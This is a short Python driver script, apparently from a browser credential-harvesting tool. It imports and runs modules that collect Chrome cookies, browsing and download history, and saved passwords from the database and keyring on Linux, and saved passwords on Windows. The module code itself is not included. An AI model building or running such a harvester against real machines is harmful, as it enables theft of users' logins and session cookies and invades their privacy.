#!/usr/local/bin/python
# coding: utf-8

from modules.linux.chrome.cookie import LinuxChromeCookie
from modules.linux.chrome.download import LinuxChromeDownload
from modules.linux.chrome.history import LinuxChromeHistory
from modules.linux.chrome.db_password import LinuxChromeDbPassword
from modules.linux.chrome.keyring_password import LinuxChromeKeyringPassword

from modules.windows.chrome.password import WindowsChromePassword

modules = [
		LinuxChromeCookie,
		LinuxChromeHistory,
		LinuxChromeDownload,
		LinuxChromeDbPassword,
		LinuxChromeKeyringPassword,
		WindowsChromePassword,
	]


def execute():
	for module in modules:
		module()
